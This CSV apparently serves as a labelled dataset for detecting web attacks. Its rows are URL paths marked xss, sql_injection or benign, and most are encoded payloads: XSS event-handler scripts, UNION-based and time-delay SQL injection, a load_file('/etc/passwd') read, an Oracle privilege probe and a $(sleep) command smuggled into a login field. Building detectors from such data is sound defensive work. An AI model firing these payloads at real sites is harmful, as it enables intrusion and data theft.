text,label
/api/v2/comments/%2A%7Bbackground%3Aurl%28xx%3Ax+%2F%2F%2A%2A%2F%5Cred%2F%2A%29%7D+%2F%2A+IE+6-7+Standards+mode+%2A%2F,xss
/api/v2/comments/%3Coutput+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Foutput%3E,xss
/api/v1/feedback?message=%3Cblink+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fblink%3E,xss
/v1/search?q=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cvar+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fvar%3E,xss
/v1/profile?bio=%3Csub+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsub%3E,xss
/api/v1/search?q=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13,sql_injection
/v1/orders?customer_id=%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--&status=active,sql_injection
/v1/products/%22%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A,sql_injection
/api/v2/profile?id=%3Cvideo+onloadstart%3Dalert%281%29%3E%3Csource%3E,xss
/api/v2/profile?id=%3Crb+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Frb%3E,xss
/api/v1/users?id=UNION+ALL+SELECT+NULL,sql_injection
/api/v2/profile?id=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ctfoot+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Ftfoot%3E,xss
/api/v2/profile?id=%3Caddress+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Faddress%3E,xss
/v1/profile?bio=%3Ctime+onclick%3D%22alert%281%29%22%3Etest%3C%2Ftime%3E,xss
/api/v2/comments/%3Cframe+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fframe%3E,xss
/v1/search?q=%3Cnextid+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fnextid%3E%3Cinput+autofocus%3E,xss
/api/v1/reviews?body=%3Ctrack+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftrack%3E,xss
/v1/products/UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%23,sql_injection
/v1/profile?bio=%3Chr+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fhr%3E,xss
/v1/profile?bio=%3Ctfoot+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Ftfoot%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Cthead+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fthead%3E,xss
/v1/products/%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520%2F%2A,sql_injection
/api/v1/users?id=%29+or+sleep%28__TIME__%29%3D,sql_injection
/api/v1/comments?text=%3Cdiv+id%3D%2253%22%3E%3Cxml+id%3D%22xss%22+src%3D%22test.htc%22%3E%3C%2Fxml%3E,xss
/v1/search?q=%3Carticle+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Farticle%3E,xss
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Chtml+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fhtml%3E,xss
/api/v1/reviews?body=%3Cxsl%3Astylesheet+id%3D%22stylesheet%22+version%3D%221.0%22+xmlns%3Axsl%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2FXSL%2FTransform%22%3E++++++++%3Cxsl%3Atemplate+match%3D%22%2F%22%3E%3Ciframe+xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxhtml%22+src%3D%22javascript%3Aalert%28125%29%22%3E%3C%2Fiframe%3E++++++++%3C%2Fxsl%3Atemplate%3E%3C%2Fxsl%3Astylesheet%3E%3Ccircle+fill%3D%22red%22+r%3D%2240%22%3E%3C%2Fcircle%3E%3C%2Fsvg%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E,xss
/api/v2/profile?id=%3Cplaintext+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fplaintext%3E,xss
/api/v1/reviews?body=%3Cbdi+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fbdi%3E,xss
/api/v1/feedback?message=%3Cimg+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fimg%3E,xss
/api/v1/reviews?body=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Capplet+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fapplet%3E,xss
/api/v2/profile?id=%3Cspan+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fspan%3E,xss
/api/v1/comments?text=%3Cli+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fli%3E,xss
/api/v2/items/1%27+and+1%3D%28select+count%28%2A%29+from+tablenames%29%3B+--?key=API_KEY,sql_injection
/v1/search?q=%3Cvideo+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fvideo%3E,xss
/api/v1/feedback?message=%3Cacronym+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Facronym%3E,xss
/api/v1/comments?text=%3Celement+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Felement%3E,xss
/v1/search?q=%3Coption+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Foption%3E,xss
/api/v1/comments?text=%3Csvg%3E%3Cscript+onlypossibleinopera%3A-%29%3E+alert%281%29,xss
/v1/orders?customer_id=ORDER+BY+3%23&status=active,sql_injection
/api/v1/reviews?body=%3Cvar+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fvar%3E,xss
/api/v2/profile?id=%3Cprogress+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fprogress%3E,xss
/api/v2/comments/%3Carea+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Farea%3E,xss
/v1/orders?customer_id=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--&status=active,sql_injection
/api/v2/profile?id=%3Crb+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Frb%3E,xss
/api/v1/reviews?body=%3Caudio+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Faudio%3E%3Cinput+autofocus%3E,xss
/api/v1/feedback?message=%3Ciframe+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fiframe%3E,xss
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cdatalist+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fdatalist%3E,xss
/api/v2/comments/%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ccite+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fcite%3E,xss
/api/v1/users?id=select+session_user+from+sysibm.sysdummy1%3B,sql_injection
/api/v1/comments?text=%3Cbdo+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbdo%3E,xss
/api/v2/comments/%3Csection+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fsection%3E,xss
/v1/profile?bio=%3Cselect+autofocus+onfocus%3Dalert%281%29%3E,xss
/api/v2/search?q=%22%2C%28select%2520if%28count%28%2A%29%21%3D-1%2Cbenchmark%283000000%2CMD5%281%29%29%2Cbenchmark%283000000%2CMD5%281%29%29%29%29%2523&key=API_KEY,sql_injection
/api/v1/reviews?body=top%5B%2Fal%2F.source%2B%2Fert%2F.source%5D%281%29,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Crt+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Frt%3E,xss
/api/v2/profile?id=%3Csamp+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fsamp%3E,xss
/v1/profile?bio=%3Chtml+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fhtml%3E,xss
/api/v2/profile?id=%3Ctfoot+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Ftfoot%3E,xss
/api/v1/comments?text=%3Carticle+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Farticle%3E,xss
/v1/search?q=%3Carea+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Farea%3E,xss
/api/v1/reviews?body=%3Chead+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fhead%3E,xss
/api/v1/search?q=%27+and+1%3D%28+if%28%28load_file%28char%28110%2C46%2C101%2C120%2C116%29%29%3C%3Echar%2839%2C39%29%29%2C1%2C0%29%29%3B,sql_injection
/api/v2/comments/%3Cmeta+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmeta%3E,xss
/api/v2/profile?id=%3Cspacer+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fspacer%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/reviews?body=%3Cscript%3Ealert%28document.head.innerHTML.substr%28146%2C20%29%29%3B%3C%2Fscript%3E,xss
/v1/profile?bio=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cq+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fq%3E,xss
/v1/products/%22%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520--,sql_injection
/api/v1/reviews?body=%3Csub+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsub%3E,xss
/api/v1/login?username=or+%27text%27+%3E+%27t%27&password=pass,sql_injection
/api/v2/comments/%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cfont+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Ffont%3E,xss
/v1/products/AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%29%29--,sql_injection
/api/v2/comments/%3Csvg%3E%3Cbutton+onload%3Dalert%281%29%3E%3C%2Fbutton%3E,xss
/api/v2/comments/%3Csvg%3E%3C%21%5BCDATA%5B%3E%3Cimage+xlink%3Ahref%3D%22%5D%5D%3E%3Cimg+src%3Dxx%3Ax+onerror%3Dalert%282%29%2F%2F%22%3E%3C%2Fsvg%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E,xss
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cpre+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fpre%3E,xss
/api/v1/users?id=%2520or%25201%3D1,sql_injection
/api/v1/feedback?message=%3Ccol+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fcol%3E%3Cinput+autofocus%3E,xss
/api/v2/items/%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+DISTINCT%28granted_role%29+FROM+%28SELECT+DISTINCT%28granted_role%29%2C+ROWNUM+AS+LIMIT+FROM+dba_role_privs+WHERE+GRANTEE%3DSYS.LOGINUSER%29+WHERE+LIMIT%3D1%29%29+AND+%27i%27%3D%27i?key=API_KEY,sql_injection
/api/v1/login?username=order+by&password=pass,sql_injection
/api/v1/feedback?message=%3Carea+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Farea%3E,xss
/api/v2/items/ORDER+BY+13%23?key=API_KEY,sql_injection
/v1/profile?bio=%3Cx%252Fonxxx%3D1,xss
/v1/profile?bio=%3Cu+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fu%3E,xss
/v1/search?q=%3Caudio+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Faudio%3E,xss
/v1/search?q=%3Cfigcaption+ondblclick%3D%22alert%281%29%22%3Etest%3C%2Ffigcaption%3E,xss
/api/v1/reviews?body=%3Cheader+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fheader%3E,xss
/api/v2/comments/%3Cmap+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fmap%3E,xss
/api/v2/comments/%3Cembed+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fembed%3E,xss
/api/v1/feedback?message=%3Cembed+id%3Dx+onfocus%3Dalert%281%29+type%3Dtext%2Fhtml%3E,xss
/v1/profile?bio=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ctable+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Ftable%3E,xss
/api/v2/items/%22+%22?key=API_KEY,sql_injection
/api/v1/reviews?body=%3Chgroup+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fhgroup%3E%3Cinput+autofocus%3E,xss
/api/v2/search?q=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--&key=API_KEY,sql_injection
/api/v2/profile?id=%3Cimage+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fimage%3E,xss
/api/v2/search?q=%27%3B+if+not%28substring%28%28select+%40%40version%29%2C25%2C1%29+%3C%3E+8%29+waitfor+delay+%270%3A0%3A2%27+--&key=API_KEY,sql_injection
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Ctable+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Ftable%3E,xss
/api/v1/login?username=%27%3Bsleep%285000%29%3B%2B%27&password=pass,sql_injection
/api/v2/profile?id=%3Cobject+data%3Djavascript,xss
/api/v1/comments?text=%3Chead+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fhead%3E%3Cinput+autofocus%3E,xss
/api/v2/users,benign
/v1/search?q=%3Cslot+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fslot%3E%3Cinput+autofocus%3E,xss
/api/v1/reviews?body=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E,xss
/api/v1/users,benign
/v1/profile?bio=%3Cfont+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ffont%3E,xss
/api/v1/feedback?message=%3Cdfn+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdfn%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cxmp+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fxmp%3E,xss
/api/v1/reviews?body=%3Cnoscript+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Fnoscript%3E,xss
/api/v1/orders/105711,benign
/api/v2/comments/%3Chead+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fhead%3E,xss
/v1/search?q=%3Csection+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fsection%3E,xss
/v1/search?q=%3Ctextarea+onkeydown%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftextarea%3E,xss
/api/v2/comments/%3Cfigcaption+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Ffigcaption%3E,xss
/v1/search?q=%3Csvg+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fsvg%3E,xss
/v1/profile?bio=%3Ctemplate+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ftemplate%3E,xss
/api/v1/reviews?body=%3Cwbr+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fwbr%3E,xss
/v1/profile?bio=%3Cmap+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fmap%3E,xss
/v1/profile?bio=%3Clink+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Flink%3E,xss
/api/v2/comments/%3Csmall+id%3Dx+tabindex%3D1+onfocus%3Dalert%281%29%3E%3C%2Fsmall%3E,xss
/api/v1/feedback?message=%3Cdatalist+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fdatalist%3E,xss
/api/v1/feedback?message=%3Cselect+autofocus+onfocusin%3Dalert%281%29%3E,xss
/v1/products/a%27+or+%27a%27+%3D+%27a,sql_injection
/api/v2/items/UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2C4?key=API_KEY,sql_injection
/api/v1/feedback?message=%3Chead+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fhead%3E,xss
/v1/search?q=%3Ccode+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fcode%3E,xss
/api/v1/feedback?message=%3Cmain+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmain%3E,xss
/v1/search?q=%3Cmenuitem+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fmenuitem%3E,xss
/api/v1/reviews?body=%3Csamp+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fsamp%3E,xss
/v1/profile?bio=%3Cmenu+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmenu%3E,xss
/v1/profile?bio=%3Cscript+onload%3Dalert%281%29+src%3Dvalidjs.js%3E%3C%2Fscript%3E,xss
/v1/orders?customer_id=0+or+1%3D1&status=active,sql_injection
/v1/search?q=%3Ctrack+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Ftrack%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/users?id=%22%29%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A,sql_injection
/api/v2/search?q=ORDER+BY+30&key=API_KEY,sql_injection
/api/v1/comments?text=%3Cprogress+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fprogress%3E,xss
/api/v2/profile?id=%3Cmap+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Fmap%3E,xss
/api/v1/users?id=%27+or+1%3D1--,sql_injection
/v1/profile?bio=%3Cblink+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fblink%3E,xss
/api/v2/comments/%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cspacer+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fspacer%3E,xss
/api/v1/login?username=%2520%24%28sleep%252050%29&password=pass,sql_injection
/api/v2/profile?id=%3Cscript+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fscript%3E,xss
/api/v2/comments/%3Cfigure+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ffigure%3E,xss
/api/v1/search?q=%2C%28select%2520if%28count%28%2A%29%21%3D-1%2Cbenchmark%283000000%2CMD5%281%29%29%2Cbenchmark%283000000%2CMD5%281%29%29%29%29%2523,sql_injection
/v1/orders?customer_id=%27+union+select+1%2Cload_file%28%27%2Fetc%2Fpasswd%27%29%2C1%2C1%2C1%3B&status=active,sql_injection
/api/v1/comments?text=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Ch1+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fh1%3E,xss
/v1/search?q=%3Celement+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Felement%3E%3Cinput+id%3Dy+autofocus%3E,xss
/v1/search?q=%3Ca+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fa%3E,xss
/api/v1/feedback?message=%3Cinput+onbeforecut%3Dalert%281%29+value%3D%22XSS%22+autofocus%3E,xss
/api/v1/search?q=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30,sql_injection
/api/v1/feedback?message=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cfigcaption+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Ffigcaption%3E,xss
/api/v1/reviews?body=%3Cmark+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fmark%3E,xss
/v1/orders?customer_id=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19&status=active,sql_injection
/api/v2/profile?id=%3Cspan+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fspan%3E,xss
/api/v1/users?id=UNION+ALL+SELECT+%40%40VERSION%2CUSER%28%29%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--,sql_injection
